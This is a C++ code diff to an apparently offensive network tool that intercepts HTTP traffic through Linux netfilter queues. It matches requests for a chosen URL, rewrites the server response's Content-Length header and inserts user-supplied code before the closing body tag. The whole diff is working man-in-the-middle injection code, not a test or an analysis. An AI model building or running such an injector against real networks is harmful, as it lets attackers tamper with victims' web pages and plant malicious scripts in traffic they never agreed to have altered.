@@ -24,57 +24,66 @@ bool32 processRequest{TRUE};
     packet is found, the clientAckNum gets set and can later be used to filter for the matching response. clientSeqNum
     is also set.
 */
-static bool32 FilterReq(const char* url, tcphdr* tcpHeader, char* payload, uint32_t& clientAckNum)
+static bool32 FilterReq(const char* url, tcphdr* tcpHeader, char* payload, uint32_t payloadLen, uint32_t& clientAckNum)
 {
     uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
     if(res == PC_HTTP_REQUEST)
     {
         if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
         {
-            char packetFileName[255]{};
-            char packetDomainName[255]{};
+            char packetFileName[FQDN_MAX_STR_LEN]{};
+            char packetDomainName[FQDN_MAX_STR_LEN]{};
             char packetFullURL[1024]{};
 
-            char buffer[255]{};
-
-            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
-            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload, '\n');
-
-            int filePathStartIndex = 4;
-            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
-            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
-            memset(buffer, '\0', sizeof(buffer));
-            packetFileName[filePathEndIndex] = '\0';
-
-            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
-            // TODO: support case-insensitivity
-            int hostIndex = PacketCraft::FindInStr(payload, "Host: ");
-            if(hostIndex == -1)
+            char* buffer = (char*)malloc(payloadLen + 1);
+            memset(buffer, '\0', payloadLen + 1);
+            memcpy(buffer, payload, payloadLen);
+            // convert to uppercase because it is case-insensitive
+            for(unsigned int i = 0; i < payloadLen; ++i)
             {
+                if(buffer[i] > 96 && buffer[i] < 123)
+                    buffer[i] = std::toupper(buffer[i]);
+            }
+
+            // Find filename. Should be something like this: "GET /test/file.php HTTP/1.1" NOTE: this is case-sensitive
+            int filePathStartIndex = PacketCraft::FindInStr(payload, "GET ") + 4;
+            int filePathEndIndex = PacketCraft::FindInStr(payload, " HTTP");
+            if(filePathStartIndex == -1 || filePathEndIndex == -1)
+            {
+                free(buffer);
                 return FALSE;
             }
 
-            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload + hostIndex, '\n');
+            memcpy(packetFileName, payload + filePathStartIndex, filePathEndIndex - filePathStartIndex);
+            packetFileName[filePathEndIndex] = '\0';
 
-            // get rid of the "Host: " portion
-            int domainStartIndex = 6;
-            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
-            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
-            memset(buffer, '\0', sizeof(buffer));
+            // Find host portion. Should be something like this: "Host: example.test.com"
+            // NOTE: this is case-insensitive, TODO: find out if there is always a space after the 'Host:' 
+            int domainStartIndex = PacketCraft::FindInStr(buffer, "HOST: ") + 6;
+            int domainEndIndex = PacketCraft::FindInStr(buffer + domainStartIndex, "\r\n") + domainStartIndex;
+            if(domainStartIndex == -1 || domainEndIndex == -1)
+            {
+                free(buffer);
+                return FALSE;
+            }
+
+            memcpy(packetDomainName, payload + domainStartIndex, domainEndIndex - domainStartIndex);
             packetDomainName[domainEndIndex] = '\0';
 
             PacketCraft::ConcatStr(packetFullURL, sizeof(packetFullURL), packetDomainName, packetFileName);
+            if(packetFullURL[PacketCraft::GetStrLen(packetFullURL) - 1] == '/')
+                packetFullURL[PacketCraft::GetStrLen(packetFullURL) - 1] = '\0';
 
-
-            std::cout << "comparing user url (" << url << ") with packet url (" << packetFullURL << ")\n"; 
             // make sure the url in the received packet matches the url the user wants to inject
             if(PacketCraft::CompareStr(packetFullURL, url) == TRUE)
             {
                 // save the ack num of the request. this is later used to filter for the correct response
                 clientAckNum = tcpHeader->ack_seq;
                 clientSeqNum = tcpHeader->seq;
+                free(buffer);
                 return TRUE;
             }
+            free(buffer);
         }
     }
     return FALSE;
@@ -131,16 +140,68 @@ static int RemoveEncoding(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, u
 
 }
 
+static int InjectNewContentLen(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
+    CHaks::NetFilterCallbackData* callbackData)
+{
+    uint32_t bufferLen = payloadLen + 1;
+    char* buffer = (char*)malloc(bufferLen);
+    memset(buffer, '\0', bufferLen);
+    memcpy(buffer, payload, payloadLen);
+
+    // convert to uppercase because it is case-insensitive
+    for(unsigned int i = 0; i < payloadLen; ++i)
+    {
+        if(buffer[i] > 96 && buffer[i] < 123)
+            buffer[i] = std::toupper(buffer[i]);
+    }
+
+    int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
+    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n") + contentLengthStartIndex;
+    int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;
+
+    int contentLen = atoi(buffer + contentLengthStartIndex);
+    if(contentLen <= 0)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
+        free(buffer);
+        return APPLICATION_ERROR;
+    }
+    int newContentLen = contentLen + callbackData->codeLen;
+    std::cout << "changing content length from " << contentLen << " to " << newContentLen << "\n";
+
+    char newContentLenStr[64]{};
+    snprintf(newContentLenStr, 64, "%d", newContentLen);
+    int newContentLenStrLen = PacketCraft::GetStrLen(newContentLenStr);
+
+    if(ipVersion == AF_INET)
+    {
+        if(nfq_tcp_mangle_ipv4(pkBuff, contentLengthStartIndex, contentLenStrSize, newContentLenStr, newContentLenStrLen) < 0)
+        {
+            free(buffer);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
+            return APPLICATION_ERROR;
+        }
+    }
+    else // NOTE: NOT TESTED!
+    {
+        if(nfq_tcp_mangle_ipv6(pkBuff, contentLengthStartIndex, contentLenStrSize, newContentLenStr, newContentLenStrLen) < 0)
+        {
+            free(buffer);
+            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
+            return APPLICATION_ERROR;
+        }
+    }
+
+    free(buffer);
+    return NO_ERROR;
+}
+
+/*
+    returns 0 when code is succesfully injected, 1 if no body tag is found and no code is injected, -1 on error
+*/
 static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint32_t payloadLen, 
     CHaks::NetFilterCallbackData* callbackData)
 {
-    std::cout << "----------\npayload before editing:\n";
-    for(unsigned int i = 0; i < payloadLen; ++i)
-    {
-        std::cout << payload[i];
-    }
-    std::cout << "\n----------\n";
-
     uint32_t bufferLen = payloadLen + callbackData->codeLen + 1;
     char* buffer = (char*)malloc(bufferLen);
     memset(buffer, '\0', bufferLen);
@@ -153,123 +214,36 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
             buffer[i] = std::toupper(buffer[i]);
     }
 
-    std::cout << "buffer converted to uppercase\n";
-
-    int contentLengthStartIndex = PacketCraft::FindInStr(buffer, "CONTENT-LENGTH: ") + 16;
-    int contentLengthEndIndex = PacketCraft::FindInStr(buffer + contentLengthStartIndex, "\r\n") + contentLengthStartIndex;
-    int contentLenStrSize = contentLengthEndIndex - contentLengthStartIndex;
-
-    std::cout << "contentLengthStartIndex: " << contentLengthStartIndex << ", contentLengthEndIndex: " << contentLengthEndIndex << "\n";
-    std::cout << "content len str size calculated: " << contentLenStrSize << "\n";
-    // 1 2 0 0
-    // . . . . .
-    char* contentLenStr = (char*)malloc(contentLenStrSize + 1);
-    memcpy(contentLenStr, buffer + contentLengthStartIndex, contentLenStrSize);
-    contentLenStr[contentLenStrSize] = '\0';
-
-    std::cout << "contentLenStr (" << contentLenStr << ") received\n";
-
-    int contentLen = atoi(contentLenStr);
-    if(contentLen <= 0)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
-        free(contentLenStr);
-        free(buffer);
-        return APPLICATION_ERROR;
-    }
-
-    char newContentLenStr[64]{};
-    snprintf(newContentLenStr, 64, "%d\r\n", callbackData->codeLen + contentLen);
-    int newContentLen = atoi(newContentLenStr);
-    if(newContentLen <= 0)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "atoi() error");
-        free(contentLenStr);
-        free(buffer);
-        return APPLICATION_ERROR;
-    }
-
-    std::cout << "new content len string received\n";
-
     int codeStartIndex = PacketCraft::FindInStr(buffer, "</BODY>");
     if(codeStartIndex == -1)
     {
-        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::FindInStr() error");
-        free(contentLenStr);
         free(buffer);
-        return APPLICATION_ERROR;
+        return 1;
     }
-
-    std::cout << "code start index received\n";
-
-    char* bufferPtr = buffer;
-    char* payloadPtr = payload;
-    memset(buffer, '\0', bufferLen);   
-
-    // copy everything from start of payload up until the value in Content-Length: 
-    memcpy(bufferPtr, payloadPtr, contentLengthStartIndex);
-    bufferPtr += contentLengthStartIndex;
-    payloadPtr += contentLengthEndIndex + 2;
-
-    std::cout << "copied until Content-Length value\n";
-
-    // copy the new content length value 
-    memcpy(bufferPtr, newContentLenStr, PacketCraft::GetStrLen(newContentLenStr));
-    bufferPtr += PacketCraft::GetStrLen(newContentLenStr);
-
-    std::cout << "copided new content len value\n";
-
-    // copy evething up until </body> tag (</body> excluded)
-    memcpy(bufferPtr, payloadPtr, codeStartIndex - (contentLengthEndIndex + 2));
-    bufferPtr += codeStartIndex - (contentLengthEndIndex + 2);
-    payloadPtr = payload + codeStartIndex;
-
-    std::cout << "copied everything until </body> tag\n";
-
-    // copy the code into the buffer
-    memcpy(bufferPtr, callbackData->code, callbackData->codeLen);
-    bufferPtr += callbackData->codeLen;
-
-    std::cout << "copied code into buffer\n";
-
-    // copy everything else from the payload starting at the </body> tag
-    memcpy(bufferPtr, payloadPtr, payloadLen - codeStartIndex);
-
-    std::cout << "copied all the rest\n";
-
-    std::cout << "----------\npayload after editing:\n";
-    for(unsigned int i = 0; i < bufferLen; ++i)
-    {
-        std::cout << buffer[i];
-    }
-    std::cout << "\n----------\n";
 
     std::cout << "mangling...\n";
 
     if(ipVersion == AF_INET)
     {
-        if(nfq_tcp_mangle_ipv4(pkBuff, 0, payloadLen, buffer, bufferLen) < 0)
+        if(nfq_tcp_mangle_ipv4(pkBuff, codeStartIndex, 0, callbackData->code, callbackData->codeLen) < 0)
         {
-            free(contentLenStr);
             free(buffer);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
-            return APPLICATION_ERROR;
+            return -1;
         }
     }
     else // NOTE: NOT TESTED!
     {
-        if(nfq_tcp_mangle_ipv6(pkBuff, 0, payloadLen, buffer, bufferLen) < 0)
+        if(nfq_tcp_mangle_ipv6(pkBuff, codeStartIndex, 0, callbackData->code, callbackData->codeLen) < 0)
         {
-            free(contentLenStr);
             free(buffer);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
-            return APPLICATION_ERROR;
+            return -1;
         }
     }
 
-    free(contentLenStr);
     free(buffer);
-    return NO_ERROR;
+    return 0;
 }
 
  static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff, int verdict = NF_ACCEPT)
@@ -338,7 +312,7 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
     }
     //////////
 
-    if(FilterReq(callbackData->url, tcpHeader, (char*)tcpPayload, clientAckNum) == TRUE)
+    if(FilterReq(callbackData->url, tcpHeader, (char*)tcpPayload, tcpPayloadLen, clientAckNum) == TRUE)
     {
         std::cout << "request filtered\n";
         if(ipVersion == AF_INET)
@@ -357,8 +331,6 @@ static int InjectCode(uint32_t ipVersion, pkt_buff* pkBuff, char* payload, uint3
                 return -1;
             }
         }
-
-        std::cout << "serverIP (" << callbackData->serverIPStr << ") saved\n";
 
         return 0;
     }
@@ -592,7 +564,8 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
     unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
     /////////
 
-    // process the inital start of the communication
+    // process the inital start of the communication, we are looking for a http request that contains the url that the user 
+    // supplied in command line arguments
     if(processRequest == TRUE)
     {
         int res = ProcessRequest(ipVersion, ipv4Header, ipv6Header, tcpHeader, (char*)tcpPayload, tcpPayloadLen, callbackData);
@@ -621,28 +594,64 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         int res = FilterIPAndTCP(ipVersion, ipv4Header, ipv6Header, tcpHeader, callbackData);
         if(res == 1) // process server
         {
-            std::cout << "server packet belonging to the tcp flow found\n";
+            std::cout << "\n----------\nserver packet belonging to the tcp flow found:\n";
+            char printBuffer[IP_MAXPACKET]{};
+            nfq_ip_snprintf(printBuffer, IP_MAXPACKET, ipv4Header);
+            std::cout << "[IP]:\n" << printBuffer << "\n";
+            memset(printBuffer, '\0', IP_MAXPACKET);
+            nfq_tcp_snprintf(printBuffer, IP_MAXPACKET, tcpHeader);
+            std::cout << "[TCP]:\n" << printBuffer << "\n";
+            memset(printBuffer, '\0', IP_MAXPACKET);
+            /*
+            std::cout << "[PAYLOAD]:\n";
+            if(tcpPayloadLen <= 0)
+                std::cout << "(empty)\n";
+            for(unsigned int i = 0; i < tcpPayloadLen; ++i)
+            {
+                std::cout << ((char*)tcpPayload)[i];
+            }
+            std::cout << "\n";
+            */
+            std::cout << "payload len: " << tcpPayloadLen << "\n";
+            uint32_t proto = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
+            std::cout << "tcp proto: " << PacketCraft::ProtoUint32ToStr(proto) << "\n";
+            std::cout << "----------\n\n";
+
             if(tcpPayloadLen > 0)
             {
-                uint32_t proto = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
-                std::cout << "tcp proto: " << proto << "\n";
                 if(proto == PC_HTTP_RESPONSE)
                 {
-                    proto = PacketCraft::GetHTTPMethod((uint8_t*)tcpPayload);
-                    std::cout << "http method: " << proto << "\n";
-                    if(proto == PC_HTTP_SUCCESS)
+                    static bool32 contentLenEdited{FALSE};
+                    if(contentLenEdited == FALSE)
                     {
-                        res = PacketCraft::FindInStr((char*)tcpPayload, "</body>");
-                        if(res > -1)
+                        if(InjectNewContentLen(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
                         {
-                            std::cout << "</body> tag found. Injecting code...\n";
-                            if(InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData) == APPLICATION_ERROR)
-                            {
-                                pktb_free(pkBuff);
-                                LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
-                                return MNL_CB_ERROR;
-                            }
+                            pktb_free(pkBuff);
+                            LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
+                            return MNL_CB_ERROR;
+                        }
+                        std::cout << "Content-Length edited\n";
+                        contentLenEdited = TRUE;
+                    }
+                    else
+                    {
+                        std::cout << "Injecting code...\n";
+                        res = InjectCode(ipVersion, pkBuff, (char*)tcpPayload, tcpPayloadLen, callbackData);
+                        if(res == -1)
+                        {
+                            pktb_free(pkBuff);
+                            LOG_ERROR(APPLICATION_ERROR, "RemoveEncoding() error");
+                            return MNL_CB_ERROR;
+                        }
+                        else if(res == 1)
+                        {
+                            std::cout << "no body tag found while injecting code\n";
+                        }
+                        else if(res == 0)
+                        {
                             std::cout << "code injected\n";
+                            contentLenEdited = FALSE;
+                            processRequest = TRUE;
                         }
                     }
                 }
@@ -650,11 +659,11 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         }
         else if(res == 0)
         {
-            std::cout << "client packet belonging to the tcp flow processed\n";
+            // std::cout << "client packet belonging to the tcp flow processed\n";
         }
         else if(res == 2)
         {
-            std::cout << "packet not belonging to the tcp flow ignored\n";
+            // std::cout << "packet not belonging to the tcp flow ignored\n";
         }
         else if(res == -1)
         {
